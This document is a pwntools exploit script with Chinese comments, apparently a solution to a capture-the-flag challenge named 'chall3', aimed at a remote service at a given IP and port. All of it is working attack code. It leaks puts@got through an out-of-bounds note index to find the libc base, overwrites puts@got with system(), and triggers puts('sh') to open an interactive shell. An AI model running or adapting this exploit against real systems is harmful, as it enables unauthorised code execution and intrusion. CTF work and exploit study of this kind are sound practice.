from pwn import *

# --- 环境配置 ---
# 在本地调试时:
# p = process("./chall3")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") # 使用你本地的libc
# 远程利用时:
p = remote("210.28.132.84", 9003)
libc = ELF("./libc.so.6") # 使用题目提供的libc

e = ELF("./chall3")

# --- 步骤 1: 泄露 puts 函数在内存中的真实地址 ---
# 计算 notes 数组到 puts@got 的偏移
offset_to_puts_got = (e.got['puts'] - e.symbols['notes']) // 8
log.info(f"Offset from notes array to puts@got: {offset_to_puts_got}")

# 使用 "Read a note" 功能读取 puts@got 的内容
p.sendlineafter(b">> ", b"1")
p.sendlineafter(b"Index: ", str(offset_to_puts_got).encode())

# 解析输出，获取地址
p.recvuntil(b" = ")
leaked_puts_addr = int(p.recvline().strip())
log.success(f"Leaked puts() address: {hex(leaked_puts_addr)}")

# --- 步骤 2: 计算 system 和 "/bin/sh" 的地址 ---
# 计算 libc 在内存中的基地址
libc_base = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc_base)}")

# 计算 system 函数的真实地址
system_addr = libc_base + libc.symbols['system']
log.success(f"Calculated system() address: {hex(system_addr)}")

# 注意：因为要执行 system("sh")，但 secret_func() 只提供了 "sh"，
# 我们可以劫持 puts@got 到 system，然后触发 puts("sh")。

# --- 步骤 3: 劫持 puts@got 为 system 的地址 ---
p.sendlineafter(b">> ", b"2")
p.sendlineafter(b"Index: ", str(offset_to_puts_got).encode())
p.sendlineafter(b"Value: ", str(system_addr).encode())
log.info("Overwrote puts@got with system address.")

# --- 步骤 4: 触发 payload ---
# 调用 secret_func()，它会执行 puts("sh")
# 由于 GOT 被劫持，实际执行的是 system("sh")
p.sendlineafter(b">> ", b"4")

p.interactive()